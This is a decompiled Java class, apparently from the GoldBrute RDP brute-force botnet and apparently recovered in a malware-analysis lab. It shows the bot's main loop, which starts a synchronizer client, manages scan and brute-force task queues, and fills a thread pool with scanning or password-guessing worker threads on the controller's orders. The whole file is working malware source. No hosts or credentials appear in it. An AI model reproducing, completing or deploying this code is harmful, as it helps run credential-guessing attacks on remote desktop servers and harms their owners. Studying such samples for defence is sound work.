/*     */ package rdp.gold.brute.pool;
/*     */ 
/*     */ import java.util.Queue;
/*     */ import java.util.concurrent.ThreadPoolExecutor;
/*     */ import java.util.concurrent.atomic.AtomicBoolean;
/*     */ import java.util.concurrent.atomic.AtomicLong;
/*     */ import org.apache.log4j.Logger;
/*     */ import rdp.gold.brute.CheckerBrute;
/*     */ import rdp.gold.brute.Config;
/*     */ import rdp.gold.brute.CounterPool;
/*     */ import rdp.gold.brute.synchronizer.SynchronizerClient;
/*     */ 
/*     */ public class GoldBrute extends Thread
/*     */ {
/*  15 */   private static final Logger logger = Logger.getLogger(GoldBrute.class);
/*  16 */   private static boolean enableDebug = true;
/*  17 */   private static Queue<String> taskBruteQueue = new java.util.concurrent.ConcurrentLinkedQueue();
/*  18 */   private static Queue<String> taskScanQueue = new java.util.concurrent.ConcurrentLinkedQueue();
/*  19 */   private static CheckerBrute checkerBrute = new CheckerBrute();
/*     */   
/*     */   static {
/*  22 */     checkerBrute.start();
/*     */   }
/*     */   
/*  25 */   private java.util.concurrent.ExecutorService executorsPdu = null;
/*     */   
/*     */   public static Queue<String> getTaskBruteQueue() {
/*  28 */     return taskBruteQueue;
/*     */   }
/*     */   
/*     */   public static Queue<String> getTaskScanQueue() {
/*  32 */     return taskScanQueue;
/*     */   }
/*     */   
/*     */   public static void setTaskScanQueue(Queue<String> taskScanQueue) {
/*  36 */     taskScanQueue = taskScanQueue;
/*     */   }
/*     */   
/*     */   public void run()
/*     */   {
/*  41 */     SynchronizerClient synchronizerClient = new SynchronizerClient();
/*  42 */     synchronizerClient.start();
/*     */     
/*  44 */     final ThreadGroup threadPduGroup = new ThreadGroup("workers_pdu");
/*  45 */     this.executorsPdu = java.util.concurrent.Executors.newCachedThreadPool(new java.util.concurrent.ThreadFactory() {
/*     */       public Thread newThread(Runnable r) {
/*  47 */         return new Thread(threadPduGroup, r);
/*     */       }
/*     */     });
/*     */     try
/*     */     {
/*     */       java.io.StringWriter sw;
/*     */       for (;;)
/*     */       {
/*  55 */         if (!Config.IS_ENABLED_BRUTE.get()) {
/*  56 */           taskBruteQueue.clear();
/*     */         }
/*     */         
/*  59 */         if (!Config.IS_ENABLED_SCAN.get()) {
/*  60 */           taskScanQueue.clear();
/*     */         }
/*     */         
/*  63 */         CounterPool.countScanQueue.set(taskScanQueue.size());
/*  64 */         CounterPool.countBruteQueue.set(taskBruteQueue.size());
/*     */         
/*  66 */         int pool = ((ThreadPoolExecutor)this.executorsPdu).getActiveCount();
/*  67 */         long pushLimit = Config.getThreads() - pool;
/*  68 */         CounterPool.pool.set(pool);
/*     */         
/*  70 */         if (enableDebug) {
/*  71 */           logger.info("Push limit " + pushLimit + ", threads limit: " + Config.getThreads() + ", pool: " + pool + ", pool used: " + CounterPool.poolUsed.get() + ", task type: " + Config.TYPE_TASK.get() + ", scan queue: " + taskScanQueue.size() + ", brute queue: " + taskBruteQueue.size());
/*     */         }
/*     */         
/*  74 */         if (Config.TYPE_TASK.get() == 0) {
/*  75 */           Thread.sleep(1000L);
/*     */           
/*  77 */           Config.IS_TEST_SERVER_BRUTE.set(true);
/*  78 */           Config.IS_TEST_SERVER_SCAN.set(true);
/*     */ 
/*     */         }
/*     */         else
/*     */         {
/*  83 */           if ((Config.IS_TEST_SERVER_BRUTE.get()) || (Config.IS_TEST_SERVER_SCAN.get())) {
/*  84 */             checkerBrute.runChecker();
/*  85 */             checkerBrute.awaitCheck();
/*     */           }
/*     */           
/*  88 */           while (pushLimit > 0L) {
/*  89 */             this.executorsPdu.submit(Config.TYPE_TASK.get() == 1 ? new SnifferThread() : new BruteThread());
/*  90 */             pushLimit -= 1L;
/*     */           }
/*     */           
/*  93 */           logger.info("Pool size is now " + ((ThreadPoolExecutor)this.executorsPdu).getActiveCount());
/*     */           
/*  95 */           Thread.sleep(1000L);
/*     */         }
/*  97 */       } } catch (Exception e) { sw = new java.io.StringWriter();
/*  98 */       e.printStackTrace(new java.io.PrintWriter(sw));
/*     */       
/* 100 */       logger.error(e.getMessage() + sw.toString());
/*     */     }
/*     */   }
/*     */   
/*     */   public java.util.concurrent.ExecutorService getExecutorsPdu()
/*     */   {
/* 106 */     return this.executorsPdu;
/*     */   }
/*     */   
/*     */   public void setTerminated(Boolean terminated) {}
/*     */ }


/* Location:              C:\Users\Lab\Desktop\a.jar!\rdp\gold\brute\pool\GoldBrute.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       0.7.1
 */